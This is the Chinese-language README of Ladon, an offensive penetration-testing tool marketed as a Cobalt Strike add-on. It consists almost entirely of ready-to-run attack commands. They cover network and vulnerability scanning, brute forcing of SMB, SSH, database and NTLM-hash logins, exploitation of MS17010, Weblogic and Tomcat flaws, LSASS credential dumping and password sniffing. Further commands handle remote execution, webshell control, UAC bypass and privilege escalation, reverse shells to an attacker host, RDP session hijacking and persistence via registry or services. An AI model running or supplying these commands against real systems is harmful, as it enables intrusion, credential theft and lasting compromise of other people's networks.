## Ladon 911 20211108
![](https://k8gege.github.io/k8img/Ladon/Dragon.jpg)

[![Author](https://img.shields.io/badge/Author-k8gege-blueviolet)](https://github.com/k8gege) 
[![Ladon](https://img.shields.io/badge/Ladon-9.1.1-yellowgreen)](https://github.com/k8gege/Ladon) 
[![Bin](https://img.shields.io/badge/Ladon-Bin-ff69b4)](https://github.com/k8gege/Ladon/releases) 
[![GitHub issues](https://img.shields.io/github/issues/k8gege/Ladon)](https://github.com/k8gege/Ladon/issues) 
[![Github Stars](https://img.shields.io/github/stars/k8gege/Ladon)](https://github.com/k8gege/Ladon) 
[![GitHub forks](https://img.shields.io/github/forks/k8gege/Ladon)](https://github.com/k8gege/Ladon)
[![GitHub license](https://img.shields.io/github/license/k8gege/Ladon)](https://github.com/k8gege/Ladon)
[![Downloads](https://img.shields.io/github/downloads/k8gege/Ladon/total?label=Release%20Download)](https://github.com/k8gege/Ladon/releases/latest)

![image](https://img-blog.csdnimg.cn/20210116233533868.gif)

### 巨龙拉冬9.0: 让你的Cobalt Strike变成超级武器

9.0插件获取：https://mp.weixin.qq.com/s/GQBXCX1fiSLi6gKY3M-JcA

### 程序简介

Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。7.2版本内置94个功能模块,外部模块18个,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息，漏洞检测包含MS17010、SMBGhost、Weblogic、ActiveMQ、Tomcat、Struts2系列等，密码爆破13种含数据库(Mysql、Oracle、MSSQL)、FTP、SSH、VNC、Windows(LDAP、SMB/IPC、NBT、WMI、SmbHash、WmiHash、Winrm)、BasicAuth、Tomcat、Weblogic、Rar等，远程执行命令包含(wmiexe/psexec/atexec/sshexec/jspshell),Web指纹识别模块可识别75种（Web应用、中间件、脚本类型、页面类型）等，可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。

### 使用文档

ID | 主题 |  URL 
-|-|-
0 | Ladon完整文档 | https://k8gege.org/Ladon

### DownLoad
New Version：https://k8gege.org/Download <br>
All Version: https://github.com/k8gege/Ladon/releases/


### 前言

本文仅是Ladon简单使用例子，Cobalt Strike、PowerShell、KaliLadon、L跨平台版等用法一致。

完整文档：http://k8gege.org/Ladon

### Socks5代理扫描

例子：扫描目标10.1.2段是否存在MS17010漏洞（必须加noping）
Ladon noping 10.1.2.8/24 MS17010

详见：http://k8gege.org/Ladon/proxy.html

### 资产扫描、指纹识别、服务识别、存活主机、端口扫描

##### 001 多协议探测存活主机 （IP、机器名、MAC地址、制造商）
Ladon 192.168.1.8/24 OnlinePC

##### 002 多协议识别操作系统 （IP、机器名、操作系统版本、开放服务）
Ladon 192.168.1.8/24 OsScan

##### 003 扫描存活主机
Ladon 192.168.1.8/24 OnlineIP

##### 004 ICMP扫描存活主机
Ladon 192.168.1.8/24 Ping

##### 005 扫描SMB漏洞MS17010 （IP、机器名、漏洞编号、操作系统版本）
Ladon 192.168.1.8/24 MS17010

##### 006 SMBGhost漏洞检测 CVE-2020-0796 （IP、机器名、漏洞编号、操作系统版本）
Ladon 192.168.1.8/24 SMBGhost

##### 007 扫描Web信息/Http服务
Ladon 192.168.1.8/24 WebScan

##### 008 扫描C段站点URL域名
Ladon 192.168.1.8/24 UrlScan

##### 009 扫描C段站点URL域名
Ladon 192.168.1.8/24 SameWeb

##### 010 扫描子域名、二级域名
Ladon baidu.com SubDomain

##### 011 域名解析IP、主机名解析IP
Ladon baidu.com DomainIP
Ladon baidu.com HostIP

##### 012 域内机器信息获取
Ladon AdiDnsDump 192.168.1.8 （Domain IP）

##### 013 扫描C段端口、指定端口扫描
Ladon 192.168.1.8/24 PortScan
Ladon 192.168.1.8 PortScan 80,445,3389

##### 014 扫描C段WEB以及CMS（75种Web指纹识别）
Ladon 192.168.1.8/24 WhatCMS

##### 015 扫描思科设备
Ladon 192.168.1.8/24 CiscoScan
Ladon http://192.168.1.8 CiscoScan

##### 016 枚举Mssql数据库主机 （数据库IP、机器名、SQL版本）
Ladon EnumMssql

##### 017 枚举网络共享资源 	（域、存活IP、共享路径）
Ladon EnumShare

##### 018 扫描LDAP服务器
Ladon 192.168.1.8/24 LdapScan

##### 019 扫描FTP服务器
Ladon 192.168.1.8/24 FtpScan

### 暴力破解/网络认证/弱口令/密码爆破/数据库/网站后台/登陆口/系统登陆

密码爆破详解参考SSH：http://k8gege.org/Ladon/sshscan.html

##### 020 445端口 SMB密码爆破(Windows)
Ladon 192.168.1.8/24 SmbScan

##### 021 135端口 Wmi密码爆破(Windowns)
Ladon 192.168.1.8/24 WmiScan

##### 022 389端口 LDAP服务器、AD域密码爆破(Windows)
Ladon 192.168.1.8/24 LdapScan

##### 023 5985端口 Winrm密码爆破(Windowns)
Ladon 192.168.1.8/24 WinrmScan.ini

##### 024 445端口 SMB NTLM HASH爆破(Windows)
Ladon 192.168.1.8/24 SmbHashScan

##### 025 135端口 Wmi NTLM HASH爆破(Windows)
Ladon 192.168.1.8/24 WmiHashScan

##### 026 22端口 SSH密码爆破(Linux)
Ladon 192.168.1.8/24 SshScan
Ladon 192.168.1.8:22 SshScan

##### 027 1433端口 Mssql数据库密码爆破
Ladon 192.168.1.8/24 MssqlScan

##### 028 1521端口 Oracle数据库密码爆破
Ladon 192.168.1.8/24 OracleScan

##### 029 3306端口 Mysql数据库密码爆破
Ladon 192.168.1.8/24 MysqlScan

##### 030 7001端口 Weblogic后台密码爆破
Ladon http://192.168.1.8:7001/console WeblogicScan
Ladon 192.168.1.8/24 WeblogicScan

##### 031 5900端口 VNC远程桌面密码爆破
Ladon 192.168.1.8/24 VncScan

##### 032 21端口 Ftp服务器密码爆破
Ladon 192.168.1.8/24 FtpScan

##### 033 8080端口 Tomcat后台登陆密码爆破
Ladon 192.168.1.8/24 TomcatScan
Ladon http://192.168.1.8:8080/manage TomcatScan

##### 034 Web端口 401基础认证密码爆破
Ladon http://192.168.1.8/login HttpBasicScan

##### 035 445端口 Impacket SMB密码爆破(Windowns)
Ladon 192.168.1.8/24 SmbScan.ini

##### 036 445端口 IPC密码爆破(Windowns)
Ladon 192.168.1.8/24 IpcScan.ini



### 漏洞检测/漏洞利用/Poc/Exp

##### 037 SMB漏洞检测(CVE-2017-0143/CVE-2017-0144)
Ladon 192.168.1.8/24 MS17010

##### 038 Weblogic漏洞检测(CVE-2019-2725/CVE-2018-2894)
Ladon 192.168.1.8/24 WeblogicPoc

##### 039 PhpStudy后门检测(phpstudy 2016/phpstudy 2018)
Ladon 192.168.1.8/24 PhpStudyPoc

##### 040 ActiveMQ漏洞检测(CVE-2016-3088)
Ladon 192.168.1.8/24 ActivemqPoc

##### 041 Tomcat漏洞检测(CVE-2017-12615)
Ladon 192.168.1.8/24 TomcatPoc

##### 042 Weblogic漏洞利用(CVE-2019-2725)
Ladon 192.168.1.8/24 WeblogicExp

##### 043 Tomcat漏洞利用(CVE-2017-12615)
Ladon 192.168.1.8/24 TomcatExp

##### 044 Struts2漏洞检测(S2-005/S2-009/S2-013/S2-016/S2-019/S2-032/DevMode)
Ladon 192.168.1.8/24 Struts2Poc


### FTP下载、HTTP下载

##### 045 HTTP下载
Ladon HttpDownLoad http://k8gege.org/Download/Ladon.rar

##### 046 Ftp下载 	
Ladon FtpDownLoad 127.0.0.1:21 admin admin test.exe

### 加密解密(HEX/Base64)

##### 047 Hex加密解密

Ladon 123456 EnHex
Ladon 313233343536 DeHex

##### 048 Base64加密解密

Ladon 123456 EnBase64
Ladon MTIzNDU2 DeBase64

### 网络嗅探

##### 049 Ftp密码嗅探 	
Ladon FtpSniffer 192.168.1.5

##### 050 HTTP密码嗅探 	
Ladon HTTPSniffer 192.168.1.5

##### 051 网络嗅探	
Ladon Sniffer

### 密码读取

##### 052 读取IIS站点密码、网站路径
Ladon IISpwd

##### DumpLsass内存密码 	
Ladon DumpLsass

### 信息收集

##### 053 进程详细信息 	
Ladon EnumProcess
Ladon Tasklist

##### 054 获取命令行参数 	
Ladon cmdline
Ladon cmdline cmd.exe

##### 055 获取渗透基础信息 	
Ladon GetInfo
Ladon GetInfo2

##### 056 .NET & PowerShell版本 	
Ladon NetVer
Ladon PSver
Ladon NetVersion
Ladon PSversion

##### 057 运行时版本&编译环境 	
Ladon Ver
Ladon Version

### 远程执行(psexec/wmiexec/atexec/sshexec)

##### 445端口 PSEXEC远程执行命令（交互式）

net user \\192.168.1.8 k8gege520 /user:k8gege
Ladon psexec 192.168.1.8
psexec> whoami
nt authority\system

##### 058 135端口 WmiExec远程执行命令 （非交互式）
Ladon wmiexec 192.168.1.8 k8gege k8gege520 whoami

##### 059 445端口 AtExec远程执行命令（非交互式）
Ladon wmiexec 192.168.1.8 k8gege k8gege520 whoami

##### 060 22端口 SshExec远程执行命令（非交互式）
Ladon SshExec 192.168.1.8 k8gege k8gege520 whoami
Ladon SshExec 192.168.1.8 22 k8gege k8gege520 whoami

##### 061 JspShell远程执行命令（非交互式）
Usage：Ladon JspShell type url pwd cmd
Example: Ladon JspShell ua http://192.168.1.8/shell.jsp Ladon whoami

#### 062 WebShell远程执行命令（非交互式）
```Bash
Usage：Ladon WebShell ScriptType ShellType url pwd cmd
Example: Ladon WebShell jsp ua http://192.168.1.8/shell.jsp Ladon whoami
Example: Ladon WebShell aspx cd http://192.168.1.8/1.aspx Ladon whoami
Example: Ladon WebShell php ua http://192.168.1.8/1.php Ladon whoami
```

### 提权降权

##### 063 BypassUac 绕过UAC执行,支持Win7-Win10 	
Ladon BypassUac c:\1.exe
Ladon BypassUac c:\1.bat

##### 064 GetSystem 提权或降权运行程序 	
Ladon GetSystem cmd.exe
Ladon GetSystem cmd.exe explorer

##### 065 Runas 模拟用户执行命令 	
Ladon Runas user pass cmd

### 其它功能

##### 066 Win2008一键启用.net 3.5	
Ladon EnableDotNet

##### 067 获取内网站点HTML源码 	
Ladon gethtml http://192.168.1.1

##### 068 检测后门
Ladon CheckDoor
Ladon AutoRun

##### 069 获取本机内网IP与外网IP 	
Ladon GetIP

##### 070 一键迷你WEB服务器 	
Ladon WebSer 80
Ladon web 80

### 反弹Shell

##### 071 反弹TCP NC Shell
Ladon ReverseTcp 192.168.1.8 4444 nc

##### 072 反弹TCP MSF Shell
Ladon ReverseTcp 192.168.1.8 4444 shell

##### 073 反弹TCP MSF MET Shell
Ladon ReverseTcp 192.168.1.8 4444 meter

##### 074 反弹HTTP MSF MET Shell
Ladon ReverseHttp 192.168.1.8 4444

##### 075 反弹HTTPS MSF MET Shell
Ladon ReverseHttps 192.168.1.8 4444

##### 076 反弹TCP CMD & PowerShell Shell
Ladon PowerCat 192.168.1.8 4444 cmd
Ladon PowerCat 192.168.1.8 4444 psh

##### 077 反弹UDP Cmd & PowerShell Shell
Ladon PowerCat 192.168.1.8 4444 cmd udp
Ladon PowerCat 192.168.1.8 4444 psh udp

##### 078 RDP桌面会话劫持（无需密码）
Ladon RDPHijack 3
Ladon RDPHijack 3 console

##### 079 OXID定位多网卡主机
Ladon 192.168.1.8/24 EthScan
Ladon 192.168.1.8/24 OxidScan

#### 080 查看用户最近访问文件
Ladon Recent

#### 081 添加注册表Run启动项
Ladon RegAuto Test c:\123.exe

#### 082 AT计划执行程序(无需时间)(system权限)
Ladon at c:\123.exe
Ladon at c:\123.exe gui

#### 083 SC服务加启动项&执行程序(system权限）
Ladon sc c:\123.exe
Ladon sc c:\123.exe gui
Ladon sc c:\123.exe auto ServerName

#### 084 MS16135提权至SYSTEM
Ladon ms16135 whoami

##### 085 BadPotato服务用户提权至SYSTEM	
Ladon BadPotato cmdline

##### 086 SweetPotato服务用户提权至SYSTEM	 	
Ladon SweetPotato cmdline

##### 087 whoami查看当前用户权限以及特权	
Ladon whoami

##### 088 Open3389一键开启3389	
Ladon Open3389

##### 089 RdpLog查看3389连接记录	
Ladon RdpLog

##### 090 QueryAdmin查看管理员用户	
Ladon QueryAdmin

##### 091 激活内置管理员Administrator	
Ladon ActiveAdmin

##### 092 激活内置用户Guest
Ladon ActiveGuest

##### 093 查看本机命名管道
Ladon GetPipe

##### 094 139端口Netbios协议Windows密码爆破
Ladon 192.168.1.8/24 NbtScan

### 最新版
最新版在小密圈：http://k8gege.org/Ladon/update.txt
<div style="text-align: center; width: 710px; border: green solid 0px;">
<img alt="" src="http://k8gege.org/img/k8team.jpg" style="display: inline-block;width: 250px;height: 300px;" />
</div>
